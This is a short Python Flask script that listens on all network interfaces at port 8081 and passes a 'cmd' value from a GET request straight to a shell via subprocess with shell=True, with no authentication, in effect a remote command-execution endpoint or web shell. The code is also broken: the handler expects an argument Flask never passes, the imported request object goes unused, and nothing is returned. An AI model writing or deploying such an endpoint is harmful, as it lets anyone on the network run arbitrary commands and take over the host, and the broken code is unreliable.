from flask import Flask
import subprocess
from flask import request
from waitress import serve

app = Flask(__name__)
@app.route('/', methods=['GET'])
def main(cmd):
	c = cmd['cmd']
	print(c)
	try:
		b = subprocess.check_output(c, shell=True).decode()
	except Exception as err:
		b = str(err)
serve(app, port=8081, host='0.0.0.0')
